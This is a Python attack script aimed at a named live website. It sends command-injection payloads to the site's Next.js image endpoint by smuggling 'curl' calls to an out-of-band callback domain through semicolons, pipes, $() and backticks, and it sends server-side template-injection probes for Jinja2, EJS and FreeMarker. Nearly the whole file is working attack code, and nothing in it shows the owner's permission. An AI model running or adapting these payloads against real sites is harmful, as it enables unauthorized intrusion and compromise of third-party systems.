import requests, os, time, urllib.parse, socket
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
CM = "oobd843b6015e60.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SS = "oobdb02ae588326.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

print("### ORACLE VALIDATION: is the OOB domain a wildcard resolver?")
for hst in [CM, "totallyrandomnonexistent"+str(int(time.time()))+".dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"]:
    try:
        print(" DNS", hst, "->", socket.gethostbyname(hst))
    except Exception as e:
        print(" DNS", hst, "ERR", e)
    try:
        r = requests.get("http://%s/probe"%hst, timeout=15)
        print(" HTTP", r.status_code, len(r.content))
    except Exception as e:
        print(" HTTP ERR", e)

GOOD = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
Q = urllib.parse.quote(GOOD, safe='')

print("\n### CMDi payloads on /_next/image")
cmdi = [
 ("semicolon-backtick", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/x.jpg;curl+http://%s/cmdi"%CM, safe='')+"&w=640&q=75"),
 ("pipe",  "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/x.jpg|curl http://%s/cmdi2"%CM, safe='')+"&w=640&q=75"),
 ("dollar-paren", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/$(curl http://%s/cmdi3).jpg"%CM, safe='')+"&w=640&q=75"),
 ("backticks in q", "/_next/image?url="+Q+"&w=640&q=%60curl%20http://%s/cmdi4%60"%CM),
 ("newline inject", "/_next/image?url="+Q+"%0acurl%20http://%s/cmdi5"%CM+"&w=640&q=75"),
 ("w param cmdi", "/_next/image?url="+Q+"&w=640;curl%20http://%s/cmdi6&q=75"%CM),
]
for lab,p in cmdi:
    try:
        r=requests.get(T+p, headers=H, timeout=40, allow_redirects=False)
        print(" %-22s %s %s" % (lab, r.status_code, r.text[:100].replace('\n',' ') if len(r.content)<2000 else ''))
    except Exception as e: print(" %-22s ERR %s"%(lab,e))

print("\n### SSTI payloads on /_next/image")
ssti = [
 ("jinja2 {{7*7}}", "/_next/image?url="+Q+"&w={{7*7}}&q=75"),
 ("jinja2 url", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/{{7*7}}.jpg", safe='')+"&w=640&q=75"),
 ("ejs ${7*7}", "/_next/image?url="+Q+"&w=${7*7}&q=75"),
 ("nunjucks range", "/_next/image?url="+Q+"&w=640&q={{range(10)}}"),
 ("freemarker", "/_next/image?url="+Q+"&w=640&q=${7*'7'}"),
 ("oob ssti q", "/_next/image?url="+Q+"&w=640&q={{config.items()}}"),
 ("oob url jinja", "/_next/image?url="+urllib.parse.quote("https://images.ctfassets.net/{{'%s'.format(1)}}.jpg"%SS, safe='')+"&w=640&q=75"),
]
for lab,p in ssti:
    try:
        r=requests.get(T+p, headers=H, timeout=40, allow_redirects=False)
        print(" %-22s %s len=%d %s" % (lab, r.status_code, len(r.content), r.text[:80].replace('\n',' ') if len(r.content)<2000 else ''))
    except Exception as e: print(" %-22s ERR %s"%(lab,e))
